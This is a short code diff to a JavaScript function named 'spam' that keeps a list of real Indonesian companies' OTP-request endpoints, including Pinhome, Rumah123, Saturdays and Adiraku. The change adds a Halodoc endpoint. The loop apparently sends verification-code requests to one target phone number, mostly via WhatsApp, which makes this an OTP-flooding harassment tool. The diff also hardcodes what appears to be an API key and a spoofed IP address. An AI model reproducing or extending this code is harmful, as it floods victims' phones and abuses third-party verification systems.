@@ -477,7 +477,8 @@ async function spam(user, id, isO, isP) {
             { url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp', data: { accountType: 'customers', applicationType: 'Pinhome Web', countryCode: '62', medium: 'whatsapp', otpType: 'register', phoneNumber: p62.replace('62', '') } },
             { url: 'https://www.rumah123.com/api/otp/request-otp', data: { ipAddress: '36.67.110.51', phoneNumber: p62, portalId: 1, type: 'WHATSAPP', url: 'https://www.rumah123.com/user/login' }, headers: { 'Base-Url-Core': 'https://www.rumah123.com' } },
             { url: 'https://beta.api.saturdays.com/api/v1/user/otp/send', data: { number: p62.replace('62', ''), country_code: '+62', type: '' }, headers: { 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'country-code': 'ID' } },
-            { url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', data: { mobileNumber: p62.replace('62', ''), type: 'prospect-create', channel: 'whatsapp' } }
+            { url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', data: { mobileNumber: p62.replace('62', ''), type: 'prospect-create', channel: 'whatsapp' } },
+            { url: 'https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests', data: { phone_number: p62 } }
         ];
         let s = 0, f = 0;
         for (let i = 0; i < otp.length; i++) {
